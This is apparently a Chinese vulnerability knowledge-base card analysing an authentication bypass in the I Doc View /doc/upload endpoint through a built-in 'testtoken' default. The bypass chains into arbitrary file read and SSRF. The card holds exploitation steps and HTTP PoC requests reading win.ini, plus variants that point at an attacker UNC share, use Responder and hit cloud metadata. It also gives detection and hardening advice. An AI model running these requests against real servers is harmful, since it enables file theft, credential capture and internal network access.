---
id: web-java-component-idocv-doc-upload-url-arbitrary-file-read
title: I Doc View /doc/upload 默认 token=testtoken 鉴权绕过 + url 参数任意文件读取：file/UNC/FTP/HTTP(S) 内容落地后回读
type: scenario
domain: web
path: web/java/component
technique: idocv-doc-upload-url-arbitrary-file-read-ssrf
tags:
- java
- idocv
- i-doc-view
- arbitrary-file-read
- ssrf
- auth-bypass
- default-token
- file-protocol
- unc
- ftp
- tomcat
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:18:04+08:00'
  notes: 已对照原文 32 张图核对：图01-02 未登录与错误 token 提示、图03-07 AppService 与 MySQL/Mongo 两套 AppDao.getByToken 源码、图08 init_mysql.sql 与图09 init_mongodb.js 均内置 test/testtoken、图10 ?token=testtoken 返回 file和url参数必选其一、图21-22 multipart 上传落盘并经 srcUrl 回读、图25-27 localPathRegex (file:///?)?(\w{1}:.+)、replaceFirst 与 readFileToByteArray、图27-29 file:///C:/windows/win.ini 实测（size 167，srcUrl /data/test/2023/1031/15/151534_167_OCHiYvt.txt）并回读 win.ini 内容、图30-32 UNC/ftp/http(s) 分支源码（Jsoup 带 Cookie）。卡片参数、PoC、响应与截图一致；affected_versions 原文未标注，保持为空；无 CVE 标注。dedup top 为 kkFileView/Dahua/Kafka 等不同产品与入口，非同链；dup-scan 无涉及 pair。未验证点：UNC/FTP/SSRF 仅有源码分支，原文未给实测，卡片已注明；未复现。
url: /docs/web/java/component/web-java-component-idocv-doc-upload-url-arbitrary-file-read/
draft: false
kb_aliases:
- I Doc View 任意文件读取
- idocv /doc/upload
- I Doc View testtoken
- 在线文档预览 文件读取
- doc/upload url file://
---

## 一句话结论

I Doc View 文档预览服务的 `GET/POST /doc/upload` 用请求参数 `token` 查 `app` 表鉴权，而初始化 SQL/Mongo 脚本内置了 `token=testtoken` 的应用记录，`?token=testtoken` 即可绕过鉴权；随后 `url` 参数命中 `(file:///?)?(\w{1}:.+)` 时被 `replaceFirst` 取第二捕获组作为本地路径读出文件内容，`//`、`ftp://`、http(s) 分支分别读 UNC 共享、FTP 与内网 HTTP，读到的内容再写入数据目录并返回可直接 GET 的 `srcUrl`，形成任意文件读取与可回显 SSRF。

## 原理

- 鉴权：`/doc/upload` 的 `upload` 方法在 `token` 非空时调用 `appService.getByToken(token)`，再要求返回的 `appPo.getId()` 非空，否则抛 `DocServiceException`“不存在该应用”。MySQL 实现 `AppDaoMySQLImpl.getByToken` 直接拼接 `select * from app where token='"+token+"'`，Mongo 实现用 `QueryBuilder.start("token").is(token)` 查 `app` 集合；两种后端都只校验“app 表中存在该 token 的应用”。
- 默认凭据：`init_mysql.sql` 用 `REPLACE INTO app (...) VALUES ('test','I Doc View','testtoken','010-80761668','support@idocv.com',...)` 建应用，`init_mongodb.js` 也 `db.app.update({_id:"test"}, {..., token:"testtoken"}, {upsert:true})`。安装后默认存在 token 为 `testtoken` 的应用，攻击者无需登录即可用 `?token=testtoken` 通过鉴权（原文实测返回 `code:"0"`，进入上传/预览逻辑）。
- 文件读取：不带 multipart 而带 `url` 参数时进入 `docService.addUrl`。方法内定义 `String localPathRegex = "(file:///?)?(\\w{1}:.+)";`，用 `url.matches(localPathRegex)` 判断后将 `url.replaceFirst(localPathRegex, "$2")` 的结果当作文件名，`new File(...)` 校验 `isFile()` 后 `FileUtils.readFileToByteArray(srcFile)` 读出全部字节赋给 `data`；`data` 再经 `docService.add → addDoc` 由 `FileUtils.writeByteArrayToFile(new File(RcUtil.getPath(rid)), data)` 写到本地数据目录，最后返回带 `srcUrl` 的 JSON。
- 落地路径可回读：`rid = RcUtil.genRid(app, name, size)` = `appId_yyyyMMdd_HHmmss_size_uuid_ext`，`RcUtil.getPath` 按 `appId/yyyy/mmdd/[hour]/...` 拼出数据目录；响应里的 `srcUrl` 形如 `/data/test/2023/1031/15/151534_167_OCHiYvt.txt`，直接 GET 该 URL 即返回刚读出的文件内容。因此“读取”步骤本身不直接回显文件，而是先把文件复制进 Web 可访问目录再取回。
- 其他协议分支：`url` 以 `//` 开头（`matches("//(.*)")`）时 `new File(url)` 在 Windows 上解析为 UNC 共享路径并 `readFileToByteArray`；`ftp://(.*)` 分支调用 `FTPUtil.downloadFTPFile` 下载；其余走 `Jsoup.connect(...)` 请求 http(s) 目标，把响应体作为 `data`，且会把当前请求的 Cookie 传给目标——构成带响应回显的 SSRF。
- 成立关键：`\w{1}:` 只匹配单个字符加冒号（盘符），所以原文的本地读取针对 Windows 盘符路径；`file:///C:/windows/win.ini` 经 `replaceFirst` 得到 `C:/windows/win.ini`，`isFile()` 为真后读出。

## 触发条件

- 目标暴露 I Doc View 预览服务 `/doc/upload`，且安装时未删除/修改初始化脚本内置的 `test` 应用（token=`testtoken` 保留）。
- 或攻击者已从其他途径获知任一有效 app token（该接口只认 token，不要求登录会话）。
- 文件读取要求服务进程对目标路径有读权限；原文以 Windows 部署演示（`C:/windows/win.ini`）。
- UNC/FTP 分支要求目标网络可达对应共享/FTP；http(s) 分支要求目标能主动外连（内网 SSRF）。

## 利用步骤

1. 探测接口：访问 `/doc/upload`，无 token 时返回“请先登录，或通过token来访问”；带 `?token=testtoken` 后不再报未登录。
2. 验证默认 token：`GET /doc/upload?token=testtoken` 返回“上传错误，file和url参数必选其一！”即 token 有效（应用存在）。
3. 读取本地文件：`GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=1.txt`。
4. 从响应 JSON 取 `srcUrl`（如 `/data/test/2023/1031/15/151534_167_OCHiYvt.txt`），GET 该路径得到文件内容。
5. 替换 `url` 为其他协议读取更多目标：`url=//attacker/share/secret.txt`（UNC）、`url=ftp://user:pass@host/file`、`url=http://169.254.169.254/latest/meta-data/`（SSRF）等，内容同样经 `srcUrl` 回读。

## PoC

```http
GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=1.txt HTTP/1.1
Host: target

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"ext":"txt","code":"1","size":"167","name":"time.txt",
 "srcUrl":"/data/test/2023/1031/15/151534_167_OCHiYvt.txt", ...}
```

```http
GET /data/test/2023/1031/15/151534_167_OCHiYvt.txt HTTP/1.1
Host: target

HTTP/1.1 200 OK
Content-Type: text/plain;charset=UTF-8

; for 16-bit app support
[fonts]
[extensions]
...
```

最小验证：`?token=testtoken` 能进入业务逻辑 + `url=file:///C:/windows/win.ini` 后 GET 返回的 `srcUrl` 内容一致，即整条链打通。原文未给出 Linux 绝对路径的直接 PoC；按 `matches` 全串匹配语义，Linux 的 `/etc/passwd` 不满足 `\w{1}:`，需另找可匹配形态（如 `//etc/passwd` 双斜杠分支，未在原文验证）。

## 变体与关联

- UNC 读取：`url=//host/share/file`，Windows 下 `new File` 走 SMB；可配合 Responder/伪造共享做凭据回连。
- FTP 读取：`url=ftp://...` 由 `FTPUtil.downloadFTPFile` 下载，可读取攻击者 FTP 上的文件（相当于任意文件下载到数据目录）。
- SSRF：http(s) 分支用 Jsoup `connect` 请求任意 URL，超时 60000ms、`maxBodySize=uploadMaxSize+1000`，并把当前请求 Cookie 透传给目标；响应体落盘后经 `srcUrl` 回读，可打内网面板/云元数据（原文只给代码，未给 SSRF 实测截图）。
- 同接口的上传分支：multipart `file` 或 `base64` 参数可直接写文件到数据目录并通过 `srcUrl` 访问，可上传/解析 HTML（原文称无法 getshell）；与文件读取共用 `testtoken` 鉴权绕过。
- 鉴权实现另一面：MySQL 实现的 `token` 为字符串拼接 SQL（`select * from app where token='"+token+"'`），理论上存在 SQL 注入，但原文未实测、且是否启用 MySQL 后端取决于部署，未单独建卡。

## 检测与防御

- 删除或强制修改 `app` 表中初始化内置的 `test`/`testtoken` 记录（MySQL 与 MongoDB 初始化脚本都要改），升级厂商修复版本。
- `/doc/upload` 强制登录态校验，不允许仅凭 URL 里的 token 访问预览/上传接口；token 使用随机长值并定期轮换。
- 对 `url` 参数做协议与目标白名单：禁止 `file:`、`//`、`ftp:`，http(s) 仅允许受信域；对路径做规范化并限制在允许的文档目录内。
- 服务以低权限账户运行，限制其对系统文件与网络共享的读权限；出站流量限制到必要目标。
- 检测：访问日志中出现 `token=testtoken`、`url=file://`、`url=//`、`url=ftp://`、`url=http(s)://内网地址`；数据目录短时间出现新的小文件并被外部 GET；服务器主动发起异常 SMB/FTP/内网 HTTP 连接。
